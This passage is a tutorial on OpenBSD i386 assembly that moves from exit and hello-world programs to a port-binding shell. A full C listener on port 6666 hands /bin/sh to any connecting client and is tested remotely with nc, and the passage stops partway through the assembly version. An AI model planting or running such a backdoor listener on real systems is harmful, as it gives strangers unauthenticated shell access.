@@ -1,0 +1,1411 @@
+|=-----------------------=[ Writing Assembly on OpenBSD ]=--------------------=|
+|=----------------------------------------------------------------------------=|
+|=-------------------------=[ lhall@telegenetic.net ]=------------------------=|
+
+
+----[ Intro
+
+I had never found a tutorial for writing asm on OpenBSD while I was learning so 
+I decided to write this, now that I have written a bit of it. OpenBSD like FreeBSD
+uses the C calling convention to execute its functions / syscalls. With the C 
+calling convention what you have is the arguments pushed onto the stack and then 
+a call <function>, with the call instruction pushing the return address of the 
+instruction following it then jumping to the address of <function>. What this means 
+for us, calling syscalls without the instruction `call` and without the use of libc,
+is that we must push an extra long onto the stack to compensate for the return 
+address, this value dosent matter but this must be done. So for what we need is the 
+syscall number in eax, the arguments pushed onto the stack and an extra push long 
+being done. Another thing we need to do is to tag our binary as an OpenBSD binary, 
+we need to do this as the OpenBSD elf header section is linked in as part of the C 
+runtime. This is accomplished by adding the following section:
+
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   8
+        .long   4
+        .long   1
+        .ascii "OpenBSD\0"
+        .long   0
+        .p2align 2
+
+A short side into whats going on here. If you check our man 5 elf you get:
+
+     .note      This section holds information in the ``Note Section'' format
+                described below.  This section is of type SHT_NOTE.  No
+                attribute types are used.  OpenBSD native executables usually
+                contain a .note.openbsd.ident section to identify themselves,
+                for the kernel to bypass any compatibility ELF binary emula-
+                tion tests when loading the file.
+
+All ELF Note elements have the same basic structure:
+
+	Name Size	4 bytes (integer)
+	Desc Size	4 bytes (integer)
+	Type		4 bytes (usually interpreted as an integer)
+	Name		variable size, padded to a 4 byte boundary
+	Desc		variable size, padded to a 4 byte boundary
+
+The Name Size and Desc Size fields are integers (in the byte order specified by the 
+binary's ELF header) which specify the size of the Name and Desc fields (excluding 
+padding).
+
+The Name field specifies the vendor who defined the format of the Note. Typically, 
+vendors use names which are related to their project and/or company names. For 
+instance, the GNU Project uses "GNU" as its name. No two vendors should use the same
+ELF Note Name, lest there be confusion when trying to interpret the meanings of notes.
+
+The Type field is vendor specific, but it is usually treated as an integer which 
+identifies the type of the note.
+
+The Desc field is vendor specific, and usually contains data which depends on the 
+note type. 
+  
+Now that thats out of the way we start with a simple exit() syscall, we need its 
+prototype and its syscall value.
+
+entropy@theo {~/asm} man 2 _exit
+
+[...snip...]
+
+SYNOPSIS
+     #include <unistd.h>
+
+     void
+     _exit(int status);
+
+[...snip...]
+
+exit() just takes the status we are exiting with.
+
+entropy@theo {~/asm} nano /usr/src/sys/kern/syscalls.c
+
+[...snip...]
+
+char *syscallnames[] = {
+
+        "exit",                 /* 1 = exit */
+
+[...snip...]
+
+Its syscall number is 1. With this info we can now write it, we'll put 1 into eax
+pushl 0 (0 means sucessful), push the extra long and call the kernel.
+
+entropy@theo {~/asm} cat exit.s
+
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+.section .text
+.globl _start
+_start:
+   xorl %eax, %eax  # set eax to 0
+   pushl %eax       # pushl the return(status) value
+   pushl %eax       # pushl the extra long
+   movl  $1, %eax   # mov 1 into eax
+   int $0x80        # call the kernel
+
+Assemble and link.
+
+entropy@theo {~/asm} as exit.s -o exit.o
+
+entropy@theo {~/asm} ld exit.o -o exit
+
+entropy@theo {~/asm} ./exit
+
+entropy@theo {~/asm} echo $?
+0
+
+To view what the .note section asembles into, you can dump the headers with 
+objdump and/or assemble with debugging symbols.
+
+entropy@theo {~/asm} objdump -D exit
+
+exit:     file format elf32-i386
+
+Disassembly of section .text:
+
+1c00014c <_start>:
+1c00014c:       31 c0                   xor    %eax,%eax
+1c00014e:       50                      push   %eax
+1c00014f:       50                      push   %eax
+1c000150:       b8 01 00 00 00          mov    $0x1,%eax
+1c000155:       cd 80                   int    $0x80
+Disassembly of section .note.openbsd.ident:
+
+1c000134 <.note.openbsd.ident>:
+1c000134:       08 00                   or     %al,(%eax)
+1c000136:       00 00                   add    %al,(%eax)
+1c000138:       04 00                   add    $0x0,%al
+1c00013a:       00 00                   add    %al,(%eax)
+1c00013c:       01 00                   add    %eax,(%eax)
+1c00013e:       00 00                   add    %al,(%eax)
+1c000140:       4f                      dec    %edi
+1c000141:       70 65                   jo     1c0001a8 <_start+0x5c>
+1c000143:       6e                      outsb  %ds:(%esi),(%dx)
+1c000144:       42                      inc    %edx
+1c000145:       53                      push   %ebx
+1c000146:       44                      inc    %esp
+1c000147:       00 00                   add    %al,(%eax)
+1c000149:       00 00                   add    %al,(%eax)
+
+entropy@theo {~/asm} as -gstabs exit.s -o exit.o
+
+entropy@theo {~/asm} ld exit.o -o exit
+
+entropy@theo {~/asm} gdb exit
+
+entropy@theo {~/asm} gdb exit
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-unknown-openbsd3.7"...
+
+Disassemble the .note section.
+
+(gdb) disas 0x1c000134 0x1c000149
+Dump of assembler code from 0x1c000134 to 0x1c000149:
+0x1c000134:     or     %al,(%eax)
+0x1c000136:     add    %al,(%eax)
+0x1c000138:     add    $0x0,%al
+0x1c00013a:     add    %al,(%eax)
+0x1c00013c:     add    %eax,(%eax)
+0x1c00013e:     add    %al,(%eax)
+0x1c000140:     dec    %edi
+0x1c000141:     jo     0x1c0001a8
+0x1c000143:     outsb  %ds:(%esi),(%dx)
+0x1c000144:     inc    %edx
+0x1c000145:     push   %ebx
+0x1c000146:     inc    %esp
+0x1c000147:     add    %al,(%eax)
+End of assembler dump.
+
+Disassemble the .text section.
+
+(gdb) disas 0x1c00014c 0x1c000155
+Dump of assembler code from 0x1c00014c to 0x1c000155:
+0x1c00014c <_start+0>:  xor    %eax,%eax
+0x1c00014e <_start+2>:  push   %eax
+0x1c00014f <_start+3>:  push   %eax
+0x1c000150 <_start+4>:  mov    $0x1,%eax
+End of assembler dump.
+
+***Note: We can execute bin's without the use of the .note section if we brand the 
+file using olf2elf, what this does is re-write a bit of the elf header by changing:
+
+ELF:
+0000000 457f 464c 0101 0001 0000 0000 0000 0000
+
+to
+
+OLF:
+0000000 4f7f 464c 0101 0101 0100 0000 0000 0000
+
+We can go through and manually do this, try with no note section in the exit prog.
+
+entropy@theo {~/asm} cat exit_elf2olf.s
+
+.section .text
+.globl _start
+_start:
+   xorl %eax, %eax  # set eax to 0
+   pushl %eax       # pushl the return(status) value
+   pushl %eax       # pushl the extra long
+   movl  $1, %eax   # mov 1 into eax
+   int $0x80        # call the kernel
+
+Assemble and link.
+
+entropy@theo {~/asm} as exit_elf2olf.s -o exit_elf2olf.o
+
+entropy@theo {~/asm} ld exit_elf2olf.o -o exit_elf2olf
+
+Check the first file with `file` to see it branded and OpenBSD binary. 
+
+entropy@theo {~/asm} file exit
+exit: ELF 32-bit LSB executable, Intel 80386, version 1, for OpenBSD, statically 
+linked, not stripped
+
+Now notice the second one missing the OpenBSD branding.
+
+entropy@theo {~/asm} file exit_elf2olf
+exit_elf2olf: ELF 32-bit LSB executable, Intel 80386, version 1, statically linked, 
+not stripped
+
+Execute will fail.
+
+entropy@theo {~/asm} ./exit_elf2olf
+
+-bash: ./exit_elf2olf: Operation not permitted
+
+Hexedit the file to be an OLF binary.
+
+entropy@theo {~/asm} hexedit exit_elf2olf
+
+Change the first line from:
+
+00000000   7F 45 4C 46  01 01 01 00  00 00 00 00  00 00 00 00  .ELF............
+
+to:
+
+00000000   7F 4F 4C 46  01 01 01 01  01 00 00 00  00 00 00 00  .OLF............
+
+Save and exit (CTRL+X, Y).
+
+entropy@theo {~/asm} file exit_elf2olf
+
+exit_elf2olf: OLF 32-bit OpenBSD dynamically linked LSB executable, Intel 80386, 
+version 1, statically linked, not stripped
+
+Execute.
+
+entropy@theo {~/asm} ./exit_elf2olf
+
+Works.
+
+entropy@theo {~/asm} echo $?
+0
+
+***End Note.
+
+Onto "Hello World", for this we'll need the write() prototype and syscall number, 
+we already have the exit().
+
+entropy@theo {~/asm} man 2 write
+
+[...snip...]
+
+SYNOPSIS
+     #include <sys/types.h>
+     #include <unistd.h>
+
+     ssize_t
+     write(int d, const void *buf, size_t nbytes);
+
+[...snip...]
+
+entropy@theo {~/asm} nano /usr/src/sys/kern/syscalls.c
+
+[...snip...]
+
+       "write",                        /* 4 = write */
+
+[...snip...]
+
+Function parameters are pushed from right to left, so we need to push the number 
+of bytes to write, the address of our string, and the file descriptor to write too 
+(we use stdout(1)). Looks easy enough.
+
+entropy@theo {~/asm} cat hello.s
+
+.section ".note.openbsd.ident", "a"
+   .p2align 2
+   .long   0x8
+   .long   0x4
+   .long   0x1
+   .ascii "OpenBSD\0"
+   .long   0x
+   .p2align 2
+
+.section .data
+hello:
+   .ascii "Hello, World!\n\0"
+
+.section .text
+.globl _start
+_start:
+   pushl $14      # number of bytes to write
+   pushl $hello   # address of our string
+   pushl $1       # 1 is stdout
+   pushl %eax     # push the extra long
+   movl $4, %eax  # 4 is write syscall
+   int $0x80      # call the kernel
+   addl $12, %esp # clean the stack - add ((# of pushl's)-1)*4 to esp
+   xor %eax, %eax # set eax to 0
+   pushl %eax     # pushl return (status value)
+   pushl %eax     # pushl extra long
+   movl $1, %eax  # 1 is exit syscall
+   int $0x80      # call the kernel
+ 
+Assemble, link and execute.
+
+entropy@theo {~/asm} as hello.s -o hello.o
+
+entropy@theo {~/asm} ld hello.o -o hello
+
+entropy@theo {~/asm} ./hello
+Hello, World!
+
+We got the basics down now so lets try something more complex, say a port binding 
+shell. For this we'll start with the normal port binding code in C so we can easily 
+read it, pull out all the values from the includes, get the values of the defines 
+then finally write the assembly.
+
+Normal port binding code minus the error checking.
+
+entropy@theo {~/asm} cat portbind.c
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netinet/in.h>
+
+#define STDIN 0
+#define STDOUT 1
+#define STDERR 2
+#define PORT 6666
+
+int
+main (void) {
+        char *shell[2];
+        int listenSocket, acceptSocket, len;
+        struct sockaddr_in s;
+        /* create a tcp socket */
+        listenSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+        /* address family */
+        s.sin_family = AF_INET;
+        /* bind to all address on box */
+        s.sin_addr.s_addr = htonl(INADDR_ANY);
+        /* listen on the port */
+        s.sin_port = htons(PORT);
+        /* bind to port */
+        bind(listenSocket, (struct sockaddr *)&s, sizeof(s));
+        /* listen for connects */
+        listen(listenSocket, 1);
+        len = sizeof(s);
+        /* accept a connect on listenign socket */
+        acceptSocket = accept(listenSocket, (struct sockaddr *)&s, &len);
+        /* dup stdin, out and err to the newly created socket */
+        dup2(acceptSocket, STDIN);
+        dup2(acceptSocket, STDOUT);
+        dup2(acceptSocket, STDERR);
+        /* char **shell */
+        shell[0] = "/bin/sh";
+        shell[1] = NULL;
+        /* exec the shell */
+        execve(shell[0], shell, NULL);
+        /* never reach here, well hopefully */
+        exit(0);
+}
+
+Compile and run.
+
+entropy@theo {~/asm} gcc portbind.c -o portbind
+
+entropy@theo {~/asm} ./portbind &
+[1] 18547
+
+entropy@theo {~/asm} netstat -na | grep LIST
+tcp        0      0  *.6666                 *.*                    LISTEN
+tcp        0      0  127.0.0.1.587          *.*                    LISTEN
+tcp        0      0  127.0.0.1.25           *.*                    LISTEN
+tcp6       0      0  ::1.587                *.*                    LISTEN
+tcp6       0      0  ::1.25                 *.*                    LISTEN
+
+entropy@theo {~/asm} uname -a
+OpenBSD theo.telegenetic.net 3.7 GENERIC.MP#0 i386
+
+And test it out on another host to make sure it works.
+
+entropy@redcell {~} perl -e '$|++;while (<>){print . "\n\x00";}'|nc theo 6666
+uname -a
+OpenBSD theo.telegenetic.net 3.7 GENERIC.MP#0 i386
+id
+uid=1000(entropy) gid=1000(entropy) groups=1000(entropy), 0(wheel)
+whoami
+entropy
+exit
+
+That works. We need the \n newline and \x00 null because we have no controlling
+terminal to append these to the strings we type.
+
+We need to get rid of as much of our include as possible and know the values for
+everything we are using. Lets go through and find out as much as possible (syscalls 
+we dont have to get rid of) check out what a struct sockaddr_in is defined as.
+
+entropy@theo {~} cat /usr/include/netinet/in.h
+
+/*
+ * IP Version 4 socket address.
+ */
+struct sockaddr_in {
+        u_int8_t    sin_len;
+        sa_family_t sin_family;
+        in_port_t   sin_port;
+        struct      in_addr sin_addr;
+        int8_t      sin_zero[8];
+};
+
+And we need the struct in_addr (defined same file):
+
+/*
+ * IP Version 4 Internet address (a structure for historical reasons)
+ */
+struct in_addr {
+        in_addr_t s_addr;
+};
+
+And finally the types for sa_family_t, in_addr_t and in_port_t :
+
+entropy@theo {~} cat /usr/include/sys/types.h
+
+typedef u_int32_t       in_addr_t;      /* base type for internet address */
+typedef u_int16_t       in_port_t;      /* IP port type */
+typedef u_int8_t        sa_family_t;    /* sockaddr address family type */
+
+So to put this all together we have:
+
+struct sockaddr_in {
+        u_int8_t    sin_len;      /* 1 byte */
+        u_int8_t    sin_family;   /* 1 byte */
+        u_int16_t   sin_port;     /* 2 bytes */
+        u_int32_t   sin_addr;     /* 4 bytes */
+        int8_t      sin_zero[8];  /* 8 bytes */
+};
+
+Now we know sizeof(sockaddr_in) is 16 bytes. Let get the values of PF_INET, 
+SOCK_STREAM, IPPROTO_TCP, AF_INET and INADDR_ANY.
+
+entropy@theo {~/asm} nano /usr/include/sys/socket.h
+
+#define PF_INET         AF_INET
+
+Its a define for AF_INET which is:
+
+#define AF_INET         2               /* internetwork: UDP, TCP, etc. */
+
+SOCK_STREAM:
+#define SOCK_STREAM     1               /* stream socket */
+
+entropy@theo {~/asm} nano /usr/include/netinet/in.h
+
+#define IPPROTO_TCP             6               /* tcp */
+
+INADDR_ANY:
+#define INADDR_ANY              __IPADDR(0x00000000)
+
+So we have:
+PF_INET = 2
+AF_INET = 2
+SOCK_STREAM = 1
+IPPROTO_TCP = 6
+INADDR_ANY = 0
+
+The htons (host to network short) just converts the byte order to big-endian so
+just do that manually:
+
+entropy@theo {~/asm} printf "0x%x\n" 6666
+0x1a0a
+entropy@theo {~/asm} printf "%d\n" 0x0a1a
+2586
+
+And of course STDIN is 0, STDOUT is 1 and STDERR is 2.
+
+With this info we can rewrite the portbind.c with our new info, we need these for 
+our asm as we wont have any includes and will be calling syscalls directlly.
+
+entropy@theo {~/asm} cat portbind2.c
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+struct sockaddr_in {
+        u_int8_t    sin_len;      /* 1 byte */
+        u_int8_t    sin_family;   /* 1 byte */
+        u_int16_t   sin_port;     /* 2 bytes */
+        u_int32_t   sin_addr;     /* 4 bytes */
+        int8_t      sin_zero[8];  /* 8 bytes */
+};
+
+int
+main (void) {
+        char *shell[2];
+        int listenSocket, acceptSocket, len;
+        struct sockaddr_in s;
+        /* create a tcp socket */
+        listenSocket = socket(2, 1, 6);
+        /* address family */
+        s.sin_family = 2;
+        /* bind to all address on box */
+        s.sin_addr = 0;
+        /* listen on the port */
+        s.sin_port = 2586;
+        /* bind to port */
+        bind(listenSocket, (struct sockaddr *)&s, 16);
+        /* listen for connects */
+        listen(listenSocket, 1);
+        len = 16;
+        /* accept a connect on listenign socket */
+        acceptSocket = accept(listenSocket, (struct sockaddr *)&s, &len);
+        /* dup stdin, out and err to the newly created socket */
+        dup2(acceptSocket, 0);
+        dup2(acceptSocket, 1);
+        dup2(acceptSocket, 2);
+        /* char **shell */
+        shell[0] = "/bin/sh";
+        shell[1] = NULL;
+        /* exec the shell */
+        execve(shell[0], shell, NULL);
+        /* never reach here, well hopefully */
+        exit(0);
+}
+
+Compile and test it.
+
+entropy@theo {~/asm} gcc portbind2.c -o portbind2
+
+entropy@theo {~/asm} ./portbind2 &
+[1] 18453
+
+entropy@theo {~/asm} netstat -na | grep LIST
+tcp        0      0  *.6666                 *.*                    LISTEN
+tcp        0      0  127.0.0.1.587          *.*                    LISTEN
+tcp        0      0  127.0.0.1.25           *.*                    LISTEN
+tcp6       0      0  ::1.587                *.*                    LISTEN
+tcp6       0      0  ::1.25                 *.*                    LISTEN
+
+
+And test from another host.
+
+entropy@redcell {~} perl -e '$|++;while (<>) { print . "\n\x00"; }' |nc theo 6666
+uname -a
+OpenBSD theo.telegenetic.net 3.7 GENERIC.MP#0 i386
+whoami
+entropy
+id
+uid=1000(entropy) gid=1000(entropy) groups=1000(entropy), 0(wheel)
+exit
+
+Works. Lets get all the syscall numbers we need, which are socket(), bind(),
+listen(), accept(), dup2(), execve() and exit().
+
+entropy@theo {~/asm} nano /usr/src/sys/kern/syscalls.c
+
+"socket",               /* 97 = socket */
+"bind",                 /* 104 = bind */
+"listen",               /* 106 = listen */
+"accept",               /* 30 = accept */
+"dup2",                 /* 90 = dup2 */
+"execve",               /* 59 = execve */
+"exit",                 /* 1 = exit */
+
+Now we need their prototypes (man 2 <syscall>):
+
+    int
+    socket(int domain, int type, int protocol);
+
+    int
+    bind(int s, const struct sockaddr *name, socklen_t namelen);
+
+    int
+    listen(int s, int backlog);
+
+    int
+    accept(int s, struct sockaddr *addr, socklen_t *addrlen);
+
+    int
+    dup2(int oldd, int newd);
+
+    int
+    execve(const char *path, char *const argv[], char *const envp[]);
+
+    void
+    _exit(int status);
+
+At this point we have everything we need to start coding, we'll go in pieces.
+
+
+---[ socket()
+
+entropy@theo {~/asm} cat portbind.s
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+
+.section .rodata
+.equ KERN, 0x80
+.equ SYS_SOCKET, 97
+.equ SYS_BIND, 104
+.equ SYS_LISTEN, 106
+.equ SYS_ACCEPT, 30
+.equ SYS_DUP2, 90
+.equ SYS_EXECVE, 59
+.equ SYS_EXIT,1
+.equ SOCKADDR_IN_SIZE, 16
+.equ PF_INET, 2
+.equ AF_INET, 2
+.equ SOCK_STREAM, 1
+.equ IPPROTO_TCP, 6
+.equ INADDR_ANY, 0
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
+
+.section .data
+s:
+sin_len:
+   .byte 0
+sin_family:
+   .byte 0
+sin_port:
+   .word 0
+sin_addr:
+   .long 0
+sin_zero:
+   .long 0,0,0,0,0,0,0,0
+sock:
+   .long 0
+
+.section .text
+.globl _start
+_start:
+   nop                     # so we can break with gdb, remove later
+   xor %eax, %eax          # set eax to 0
+   pushl $IPPROTO_TCP      # pushl the proto
+   pushl $SOCK_STREAM      # pushl sock_stream
+   pushl $PF_INET          # pushl protocol family
+   pushl %eax              # pushl extra long
+   movl $SYS_SOCKET, %eax  # syscall number sys_socket(97) into eax
+   int $KERN               # call the kernel
+   addl $12, %esp          # clean stack (# of pushl's-1)*4
+   movl %eax, sock         # save the socket file descriptor
+
+   xorl %eax, %eax         # set eax to 0
+   pushl %eax              # pushl the return(status) value
+   pushl %eax              # pushl the extra long
+   movl  $1, %eax          # mov 1 into eax
+   int $0x80               # call the kernel
+
+
+Assemble with debugging while were writing it.
+
+entropy@theo {~/asm} as -gstabs portbind.s -o portbind.o
+
+entropy@theo {~/asm} ld portbind.o -o portbind
+
+Trace it to see the syscall's...
+
+entropy@theo {~/asm} ktrace ./portbind
+
+entropy@theo {~/asm} kdump
+   437 ktrace   RET   ktrace 0
+   437 ktrace   CALL  execve(0xcfbf746f,0xcfbf7324,0xcfbf732c)
+   437 ktrace   NAMI  "./portbind"
+   437 portbind EMUL  "native"
+   437 portbind RET   execve 0
+   437 portbind CALL  socket(0x2,0x1,0x6)
+   437 portbind RET   socket 3
+   437 portbind CALL  exit(0)
+
+We can see that socket is being called with the correct paramerters and is returning 
+the value for the socket file descriptor which is what we want. We must make sure 
+though that socket() is returning the value into eax as not all *BSD syscalls return 
+into eax.
+
+entropy@theo {~/asm} gdb portbind
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-unknown-openbsd3.7"...
+(gdb) break *_start+1
+Breakpoint 1 at 0x1c00014d: file portbind.s, line 48.
+(gdb) run
+Starting program: /home/entropy/asm/portbind
+
+Breakpoint 1, _start () at portbind.s:48
+48         xor %eax, %eax          # set eax to 0
+Current language:  auto; currently asm
+(gdb) step
+_start () at portbind.s:49
+49         pushl $IPPROTO_TCP      # pushl the proto
+(gdb)
+_start () at portbind.s:50
+50         pushl $SOCK_STREAM      # pushl sock_stream
+(gdb)
+_start () at portbind.s:51
+51         pushl $PF_INET          # pushl protocol family
+(gdb)
+_start () at portbind.s:52
+52         pushl %eax              # pushl extra long
+(gdb)
+_start () at portbind.s:53
+53         movl $SYS_SOCKET, %eax  # syscall number sys_socket(97) into eax
+(gdb)
+_start () at portbind.s:54
+54         int $KERN               # call the kernel
+(gdb)
+_start () at portbind.s:56
+56         movl %eax, sock         # save the socket file descriptor
+(gdb)
+_start () at portbind.s:58
+58         xorl %eax, %eax         # set eax to 0
+
+Check eax for the return value to make sure its good( > 0).
+
+(gdb) print $eax
+$1 = 7
+
+Check sock.
+
+(gdb) x/d &sock
+0x3c000028 <sock>:      7
+(gdb) c
+Continuing.
+
+Program exited normally.
+
+Everything looks good, lets move on adding in the bind() call.
+
+
+---[ bind()
+
+entropy@theo {~/asm} cat portbind.s
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+
+.section .rodata
+.equ KERN, 0x80
+.equ SYS_SOCKET, 97
+.equ SYS_BIND, 104
+.equ SYS_LISTEN, 106
+.equ SYS_ACCEPT, 30
+.equ SYS_DUP2, 90
+.equ SYS_EXECVE, 59
+.equ SYS_EXIT,1
+.equ SOCKADDR_IN_SIZE, 16
+.equ PF_INET, 2
+.equ AF_INET, 2
+.equ SOCK_STREAM, 1
+.equ IPPROTO_TCP, 6
+.equ INADDR_ANY, 0
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
+.equ PORT, 2586
+
+.section .data
+sockaddr_in:
+sin_len:
+   .byte 0
+sin_family:
+   .byte 0
+sin_port:
+   .word 0
+sin_addr:
+   .long 0
+sin_zero:
+   .long 0,0,0,0,0,0,0,0
+sock:
+   .long 0
+
+.section .text
+.globl _start
+_start:
+   nop                        # so we can break with gdb, remove later
+   xor %eax, %eax             # set eax to 0
+   pushl $IPPROTO_TCP         # pushl the proto
+   pushl $SOCK_STREAM         # pushl sock_stream
+   pushl $PF_INET             # pushl protocol family
+   pushl %eax                 # pushl extra long
+   movl $SYS_SOCKET, %eax     # syscall number sys_socket(97) into eax
+   int $KERN                  # call the kernel
+   addl $12, %esp             # clean stack (# of pushl's-1)*4
+   movl %eax, sock            # save the socket file descriptor
+
+   movl $AF_INET, sin_family  # movl address family value into sin_family
+   movl $INADDR_ANY, sin_addr # movl inaddr_any to sin_addr
+   movl $PORT, sin_port       # movl port into sin_port
+
+   pushl $SOCKADDR_IN_SIZE    # pushl the size of the struct
+   pushl $sockaddr_in         # pushl the address of the struct
+   pushl sock                 # pushl our sock we recieved from socket
+   pushl %eax                 # pushl the extra long
+   movl $SYS_BIND, %eax       # syscall number sys_bind(104) into eax
+   int $KERN                  # call the kernel
+   addl $12, %esp             # clean stack (# of pushl's-1)*4
+
+   xorl %eax, %eax            # set eax to 0
+   pushl %eax                 # pushl the return(status) value
+   pushl %eax                 # pushl the extra long
+   movl  $1, %eax             # mov 1 into eax
+   int $0x80                  # call the kernel
+
+
+entropy@theo {~/asm} as -gstabs portbind.s -o portbind.o
+
+entropy@theo {~/asm} ld portbind.o -o portbind
+
+entropy@theo {~/asm} ktrace ./portbind
+
+entropy@theo {~/asm} kdump
+ 19191 ktrace   RET   ktrace 0
+ 19191 ktrace   CALL  execve(0xcfbfce4b,0xcfbfcd00,0xcfbfcd08)
+ 19191 ktrace   NAMI  "./portbind"
+ 19191 portbind EMUL  "native"
+ 19191 portbind RET   execve 0
+ 19191 portbind CALL  socket(0x2,0x1,0x6)
+ 19191 portbind RET   socket 3
+ 19191 portbind CALL  bind(0x3,0x3c000000,0x10)
+ 19191 portbind RET   bind 0
+ 19191 portbind CALL  exit(0)
+
+
+---[ listen()
+
+entropy@theo {~/asm} cat portbind.s
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+
+.section .rodata
+.equ KERN, 0x80
+.equ SYS_SOCKET, 97
+.equ SYS_BIND, 104
+.equ SYS_LISTEN, 106
+.equ SYS_ACCEPT, 30
+.equ SYS_DUP2, 90
+.equ SYS_EXECVE, 59
+.equ SYS_EXIT,1
+.equ SOCKADDR_IN_SIZE, 16
+.equ PF_INET, 2
+.equ AF_INET, 2
+.equ SOCK_STREAM, 1
+.equ IPPROTO_TCP, 6
+.equ INADDR_ANY, 0
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
+.equ PORT, 2586
+
+.section .data
+sockaddr_in:
+sin_len:
+   .byte 0
+sin_family:
+   .byte 0
+sin_port:
+   .word 0
+sin_addr:
+   .long 0
+sin_zero:
+   .long 0,0,0,0,0,0,0,0
+sock:
+   .long 0
+
+.section .text
+.globl _start
+_start:
+   nop                        # so we can break with gdb, remove later
+   xor %eax, %eax             # set eax to 0
+   pushl $IPPROTO_TCP         # pushl the proto
+   pushl $SOCK_STREAM         # pushl sock_stream
+   pushl $PF_INET             # pushl protocol family
+   pushl %eax                 # pushl extra long
+   movl $SYS_SOCKET, %eax     # syscall number sys_socket(97) into eax
+   int $KERN                  # call the kernel
+   addl $12, %esp             # clean stack (# of pushl's-1)*4
+   movl %eax, sock            # save the socket file descriptor
+
+   movl $AF_INET, sin_family  # movl address family value into sin_family
+   movl $INADDR_ANY, sin_addr # movl inaddr_any to sin_addr
+   movl $PORT, sin_port       # movl port into sin_port
+
+   pushl $SOCKADDR_IN_SIZE    # pushl the size of the struct
+   pushl $sockaddr_in         # pushl the address of the struct
+   pushl sock                 # pushl our sock we recieved from socket
+   pushl %eax                 # pushl the extra long
+   movl $SYS_BIND, %eax       # syscall number sys_bind(104) into eax
+   int $KERN                  # call the kernel
+   addl $12, %esp             # clean stack (# of pushl's-1)*4
+
+   pushl $1                   # pushl backlog (amount of connections)
+   pushl sock                 # push our sock
+   pushl %eax                 # pushl the extra long
+   movl $SYS_LISTEN, %eax     # syscall number sys_listen(106) into eax
+   int $KERN                  # call the kernel
+   addl $8, %esp              # clean stack (# of pushl's-1)*4
+
+   xorl %eax, %eax            # set eax to 0
+   pushl %eax                 # pushl the return(status) value
+   pushl %eax                 # pushl the extra long
+   movl  $1, %eax             # mov 1 into eax
+   int $0x80                  # call the kernel
+
+entropy@theo {~/asm} as -gstabs portbind.s -o portbind.o
+
+entropy@theo {~/asm} ld portbind.o -o portbind
+
+entropy@theo {~/asm} ktrace ./portbind
+
+entropy@theo {~/asm} kdump
+ 21863 ktrace   RET   ktrace 0
+ 21863 ktrace   CALL  execve(0xcfbf7cd7,0xcfbf7b8c,0xcfbf7b94)
+ 21863 ktrace   NAMI  "./portbind"
+ 21863 portbind EMUL  "native"
+ 21863 portbind RET   execve 0
+ 21863 portbind CALL  socket(0x2,0x1,0x6)
+ 21863 portbind RET   socket 3
+ 21863 portbind CALL  bind(0x3,0x3c000000,0x10)
+ 21863 portbind RET   bind 0
+ 21863 portbind CALL  listen(0x3,0x1)
+ 21863 portbind RET   listen 0
+ 21863 portbind CALL  exit(0)
+
+
+---[ accept()
+
+entropy@theo {~/asm} cat portbind.s
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+
+.section .rodata
+.equ KERN, 0x80
+.equ SYS_SOCKET, 97
+.equ SYS_BIND, 104
+.equ SYS_LISTEN, 106
+.equ SYS_ACCEPT, 30
+.equ SYS_DUP2, 90
+.equ SYS_EXECVE, 59
+.equ SYS_EXIT,1
+.equ SOCKADDR_IN_SIZE, 16
+.equ PF_INET, 2
+.equ AF_INET, 2
+.equ SOCK_STREAM, 1
+.equ IPPROTO_TCP, 6
+.equ INADDR_ANY, 0
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
+.equ PORT, 2586
+
+.section .data
+sockaddr_in:
+sin_len:
+   .byte 0
+sin_family:
+   .byte 0
+sin_port:
+   .word 0
+sin_addr:
+   .long 0
+sin_zero:
+   .long 0,0,0,0,0,0,0,0
+sock:
+   .long 0
+socklen:
+   .long 0
+
+.section .text
+.globl _start
+_start:
+   nop                          # so we can break with gdb, remove later
+   xor %eax, %eax               # set eax to 0
+   pushl $IPPROTO_TCP           # pushl the proto
+   pushl $SOCK_STREAM           # pushl sock_stream
+   pushl $PF_INET               # pushl protocol family
+   pushl %eax                   # pushl extra long
+   movl $SYS_SOCKET, %eax       # syscall number sys_socket(97) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+   movl %eax, sock              # save the socket file descriptor
+
+   movl $AF_INET, sin_family    # movl address family value into sin_family
+   movl $INADDR_ANY, sin_addr   # movl inaddr_any to sin_addr
+   movl $PORT, sin_port         # movl port into sin_port
+
+   pushl $SOCKADDR_IN_SIZE      # pushl the size of the struct
+   pushl $sockaddr_in           # pushl the address of the struct
+   pushl sock                   # pushl our sock we recieved from socket
+   pushl %eax                   # pushl the extra long
